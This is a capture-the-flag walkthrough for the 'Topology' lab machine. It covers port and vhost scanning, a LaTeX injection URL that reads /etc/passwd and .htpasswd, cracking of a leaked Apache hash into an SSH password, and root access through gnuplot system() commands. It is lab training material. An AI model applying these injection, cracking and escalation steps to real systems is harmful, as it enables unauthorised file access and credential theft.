## 1. Reconnaissance
### Nmap
```
$ nmap -p- -sS -sC -sV --min-rate 5000 10.10.11.217

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 dcbc3286e8e8457810bc2b5dbf0f55c6 (RSA)
|   256 d9f339692c6c27f1a92d506ca79f1c33 (ECDSA)
|_  256 4ca65075d0934f9c4a1b890a7a2708d7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Index of /
| http-ls: Volume /
|   maxfiles limit reached (10)
| SIZE  TIME              FILENAME
| -     2023-01-17 12:26  demo/
| 1.0K  2023-01-17 12:26  demo/fraction.png
| 1.1K  2023-01-17 12:26  demo/greek.png
| 1.1K  2023-01-17 12:26  demo/sqrt.png
| 1.0K  2023-01-17 12:26  demo/summ.png
| 3.8K  2023-06-12 07:37  equation.php
| 662   2023-01-17 12:26  equationtest.aux
| 17K   2023-01-17 12:26  equationtest.log
| 0     2023-01-17 12:26  equationtest.out
| 28K   2023-01-17 12:26  equationtest.pdf
|_
Service Info: Host: topology.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### Dir scan
```
$ gobuster dir -u http://10.10.11.217/ -w /usr/share/wordlists/dirb/big.txt

/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.217/css/]
/images               (Status: 301) [Size: 313] [--> http://10.10.11.217/images/]
/javascript           (Status: 301) [Size: 317] [--> http://10.10.11.217/javascript/]
/portraits            (Status: 301) [Size: 316] [--> http://10.10.11.217/portraits/]
/server-status        (Status: 403) [Size: 277]
/~bin                 (Status: 403) [Size: 277]
/~lp                  (Status: 403) [Size: 277]
/~mail                (Status: 403) [Size: 277]
/~nobody              (Status: 403) [Size: 277]
/~sys                 (Status: 403) [Size: 277]
Progress: 20469 / 20470 (100.00%)
```
### Vhost scan
```
$ gobuster vhost -u topology.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain

Found: dev.topology.htb Status: 401 [Size: 463]
Found: stats.topology.htb Status: 200 [Size: 108]
```

## 2. Enumeration
- Access web page, find another subdomain `latex.topology.htb`

## 3. User shell
- Try latex injection from Hacktrick, observe can read file `http://latex.topology.htb/equation.php?eqn=%24%5clstinputlisting%7b%2fetc%2fpasswd%7d%24&submit=`
- Read file `/.htpasswd` file and try to access the `dev.topology.htb` domain
```
vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
```
- Identify hash type
```
$ hashid '$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0' 

Analyzing '$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0'
[+] MD5(APR) 
[+] Apache MD5 
```
- Crack password with hashcat
```
$ hashcat -m 1600 users.hash /usr/share/wordlists/rockyou.txt

$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0:calculus20
```
- SSH with creds `vdaisley:calculus20` to get `user.txt`

## 4. Root shell
- Run `pspy64` to check root process, observe gnuplot is run as root
- Write new `.plt` file to get root shell 
```
system "command string"
! command string
output = system("command string")
show variable GPVAL_SYSTEM
```